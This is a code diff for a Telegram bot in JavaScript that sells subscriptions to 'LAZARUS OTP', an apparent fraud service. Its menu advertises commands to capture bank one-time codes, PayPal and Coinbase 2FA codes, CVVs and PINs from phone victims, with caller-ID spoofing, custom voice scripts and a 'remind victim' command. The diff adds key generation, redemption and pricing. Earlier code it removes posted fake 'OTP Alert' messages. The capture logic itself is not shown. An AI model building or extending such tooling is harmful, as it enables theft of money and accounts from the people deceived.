@@ -14,112 +14,155 @@ let userSubscriptions = {};
 let userKeys = {};
 let keyExpirations = {};
 
-const PRICES = { "1 Week": 55, "2 Weeks": 70, "1 Month": 100, "Lifetime": 550 };
+const services = ["Netflix", "PayPal", "Bank", "Coinbase", "Spotify", "Cvv", "Pin", "Crypto", "Apple Pay", "Amazon", "Microsoft", "Venmo", "Cashapp", "Quadpay", "Bank Of America"];
+const names = ["John", "Alice", "Mark", "Sophia", "Leo", "Emma", "Ahmed", "Salim", "Farid", "Magnan", "Lina", "Adam", "Orion", "Yara", "Amine", "Ahmed", "Jerry", "Salma", "William", "George", "Periz", "Nouh", "John", "Thomas", "Eric", "Mike"];
 
-const pendingPayments = {};
+const PRICES = { "1 Week": 55, "2 Weeks": 70, "1 Month": 100, "Lifetime": 550 };
 
 function generateOtp() {
   return Array.from({ length: 6 }, () => Math.floor(Math.random() * 10)).join('');
 }
 
-function sendReminder(userId, paymentId) {
-  bot.api.sendMessage(userId, `⏳ Reminder: We have not received payment for your subscription yet.\nPlease confirm the payment within the next few minutes.`);
-  pendingPayments[paymentId].remindersSent++;
+function maskName(name) {
+  return '*'.repeat(name.length);
 }
 
-async function cancelTransaction(userId, paymentId) {
-  delete pendingPayments[paymentId];
-  await bot.api.sendMessage(userId, `❌ Payment not received within the allowed time. Your transaction has been canceled.`);
+function generateKey(prefix, duration) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const randomPart = Array.from({ length: 27 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+  const key = `${prefix}-OTP-${randomPart}`;
+  const expiresAt = duration === 'lifetime' ? null : Date.now() + parseDuration(duration);
+  VALID_KEYS.push(key);
+  keyExpirations[key] = expiresAt;
+  return key;
 }
 
-bot.command("payment_check", async (ctx) => {
-  const userId = ctx.from.id;
-  const args = ctx.message.text.split(' ').slice(1);
-  if (args.length === 0) return ctx.reply("❗ Please provide a valid payment ID.");
+function parseDuration(duration) {
+  if (duration.endsWith('minutes')) return parseInt(duration) * 60 * 1000;
+  if (duration.endsWith('hours')) return parseInt(duration) * 60 * 60 * 1000;
+  if (duration.endsWith('days')) return parseInt(duration) * 24 * 60 * 60 * 1000;
+  if (duration.endsWith('month')) return 30 * 24 * 60 * 60 * 1000;
+  if (duration.endsWith('year')) return 365 * 24 * 60 * 60 * 1000;
+  return 0;
+}
 
-  const paymentId = args[0].trim();
-  if (pendingPayments[paymentId]) {
-    const payment = pendingPayments[paymentId];
-    if (payment.remindersSent >= 5) {
-      await cancelTransaction(userId, paymentId);
-    } else {
-      sendReminder(userId, paymentId);
-    }
-  } else {
-    await ctx.reply("❌ Invalid or expired payment ID.");
-  }
-});
+const startMessage = `🚀 Welcome to Our Otp Bot 🚀
 
-bot.callbackQuery(/payment_(\w+)/, async (ctx) => {
-  const method = ctx.match[1];
-  let paymentMessage = "";
-  
-  // Replace with actual payment info later
-  const paymentId = generateOtp(); // Generate a unique payment ID for this transaction
+🔐 ➔ /redeem | Redeem your subscription
+⏱ ➔ /plan | Check your subscription
 
-  if (method === 'usdt') {
-    paymentMessage = `🪙 Send the amount to the following USDT wallet address:\n\n📍 Address: [Your USDT Address Here]`;
-  } else if (method === 'binance') {
-    paymentMessage = `💳 Send the amount to the Binance ID below:\n\n📍 Binance ID: [Your Binance ID Here]`;
-  } else if (method === 'ethereum') {
-    paymentMessage = `🪙 Send the amount to the following Ethereum address:\n\n📍 Address: [Your Ethereum Address Here]`;
-  }
+📝 Custom Commands
+𞷾 ➔ /createscript | Create custom scripts
+🔏 ➔ /script [scriptid] | View script
+😗 ➔ /customcall | Call with script
 
-  pendingPayments[paymentId] = {
-    userId: ctx.from.id,
-    paymentMethod: method,
-    remindersSent: 0,
-    paymentReceived: false,
-    timeout: setTimeout(() => cancelTransaction(ctx.from.id, paymentId), 5 * 60 * 1000) // 5 minutes timeout
-  };
+📝 Calling Modules
+📞 ➔ /call | Capture PayPal, CoinBase...
+🏦 ➔ /bank | Capture OTP Bank
+💳 ➔ /cvv | Capture CVV
+🔢 ➔ /pin | Capture PIN
+🍏 ➔ /applepay | Capture OTP Credit Card
+🔵 ➔ /coinbase | Capture 2FA Code
+💸 ➔ /crypto | Capture Crypto Code
+📦 ➔ /amazon | Approval Authentication
+💻 ➔ /microsoft | Capture Microsoft Code
+🅿️ ➔ /paypal | Capture Paypal Code
+🏦 ➔ /venmo | Capture Venmo Code
+💵 ➔ /cashapp | Capture Cashapp Code
+💳 ➔ /quadpay | Capture quadpay Code
+📿 ➔ /carrier | Capture carrier Code
+📧 ➔ /email | grab Email code
+🕖 ➔ /remind | remind victim
 
-  await ctx.answerCallbackQuery();
-  
-  await ctx.reply(paymentMessage, {
+SET CUSTOM VOICE
+😗 ➔ /customvoice | Modify the TTS
+❗️ ➔ EXAMPLE: /customvoice number spoof service name sid language
+
+🔰 Purchase LAZARUS OTP 🔰
+⌨️ /recall for re-calling
+❓ Use ? in number to spoof random number`;
+
+bot.command("start", async (ctx) => {
+  await ctx.reply(startMessage, {
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📋 Copy Address/ID", callback_data: "copy_address" }],
-        [{ text: "💳 I paid", callback_data: "i_paid_" + paymentId }],
-        [{ text: "❌ Cancel", callback_data: "cancel_payment_" + paymentId }]
+        [{ text: "📢 Channel", url: "https://t.me/LAZARUS_OTP" }],
+        [{ text: "🛒 Purchase", callback_data: "purchase" }]
       ]
     }
   });
 });
 
-bot.callbackQuery(/i_paid_(\w+)/, async (ctx) => {
-  const paymentId = ctx.match[1];
-  if (pendingPayments[paymentId]) {
-    pendingPayments[paymentId].paymentReceived = true;
-    clearTimeout(pendingPayments[paymentId].timeout); // Cancel the timeout since payment was received
-    await ctx.answerCallbackQuery();
-    await ctx.reply("✅ Payment confirmed! Your subscription will be activated shortly.");
-  }
-});
-
-bot.callbackQuery(/cancel_payment_(\w+)/, async (ctx) => {
-  const paymentId = ctx.match[1];
-  if (pendingPayments[paymentId]) {
-    clearTimeout(pendingPayments[paymentId].timeout); // Cancel the timeout
-    delete pendingPayments[paymentId]; // Remove from pending payments
-    await ctx.answerCallbackQuery();
-    await ctx.reply("❌ Payment process canceled.");
-  }
-});
-
-async function sendRandomMessages() {
-  while (true) {
-    const service = ["Netflix", "PayPal", "Bank", "Coinbase", "Spotify", "Cvv", "Pin", "Crypto", "Apple Pay", "Amazon", "Microsoft", "Venmo", "Cashapp", "Quadpay", "Bank Of America"][Math.floor(Math.random() * 16)];
-    const otp = generateOtp();
-    const msg = `🔑 OTP Alert!\n🧩 Service: ${service}\n🔐 OTP: ${otp}`;
-    try {
-      await bot.api.sendMessage(CHANNEL_ID, msg);
-      console.log("✅ Sent:", msg);
-    } catch (e) {
-      console.error("❌ Error sending message:", e.message);
+bot.callbackQuery("purchase", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.reply("💳 Purchase your plan", {
+    reply_markup: {
+      inline_keyboard: Object.keys(PRICES).map(label => [{
+        text: `💰 ${label} : $${PRICES[label]}`,
+        callback_data: `sub_${label.replace(/\s+/g, "_")}`
+      }])
     }
-    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1000000) + 900000));
+  });
+});
+
+bot.command("redeem", (ctx) => {
+  const userId = ctx.from.id;
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length === 0) return ctx.reply("🔑 Please send a key like this: /redeem YOUR_KEY");
+
+  const key = args[0].trim();
+  const expiration = keyExpirations[key];
+
+  if (VALID_KEYS.includes(key) && (!expiration || expiration > Date.now())) {
+    userSubscriptions[userId] = true;
+    userKeys[userId] = key;
+
+    let message = "✅ Key accepted! Subscription activated.";
+    if (expiration) {
+      const timeLeft = expiration - Date.now();
+      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      message += `\n\n⏱ Subscription valid for: ${days}d ${hours}h ${minutes}m`;
+    } else {
+      message += `\n\n⏱ Subscription valid: Lifetime`;
+    }
+
+    ctx.reply(message);
+  } else {
+    ctx.reply("❌ Invalid or expired key.\nPlease contact the admin to purchase a valid one.");
   }
-}
+});
+
+bot.command("plan", (ctx) => {
+  ctx.reply(`LAZARUS-O-T-P CALL ☎️ 🌐 With great prices:\n\n💰 1 Day : $20\n💰 2 Days : $30\n💰 1 Week : $55\n💰 2 Weeks : $70\n💰 1 Month : $100\n💰 3 Months : $250\n💰 Lifetime : $550\n\nDM @CKRACKING_MOROCCO to get your key 🔑\n📩 Support: @CKRACKING_MOROCCO`);
+});
+
+bot.command("purchase", async (ctx) => {
+  const userId = ctx.from.id;
+  if (!userSubscriptions[userId]) {
+    await ctx.reply("💳 Please choose your plan below:", {
+      reply_markup: {
+        inline_keyboard: Object.keys(PRICES).map(label => [{
+          text: `💰 ${label} : $${PRICES[label]}`,
+          callback_data: `sub_${label.replace(/\s+/g, "_")}`
+        }])
+      }
+    });
+  }
+});
+
+// الرد على أي أمر آخر غير /redeem و /purchase و /email إذا لم يكن لديه اشتراك
+bot.on('message', async (ctx) => {
+  const userId = ctx.from.id;
+  const text = ctx.message.text;
+
+  if (text !== "/redeem" && text !== "/purchase" && text !== "/email" && !userSubscriptions[userId]) {
+    ctx.reply(`Lazarus OTP Bot v4.0\n\n🚀 Limited Access: Only few spots remaining!\n\n⚠ No Active Subscription Detected!\n\n🔑 To activate the bot, type /purchase Or contact ${ADMIN_USERNAME}.`);
+  } else {
+    // يمكنك إضافة معالجات أخرى هنا إذا أردت
+  }
+});
 
 app.use(bodyParser.json());
 app.use(webhookCallback(bot, "express"));
@@ -130,6 +173,5 @@ app.get("/", (req, res) => {
 
 app.listen(3000, async () => {
   console.log("Bot server running on port 3000");
-  await bot.api.setWebhook("https://otpp-lkgy.onrender.com");
-  sendRandomMessages();
+  await bot.api.setWebhook("https://your-webhook-url.com");
 });
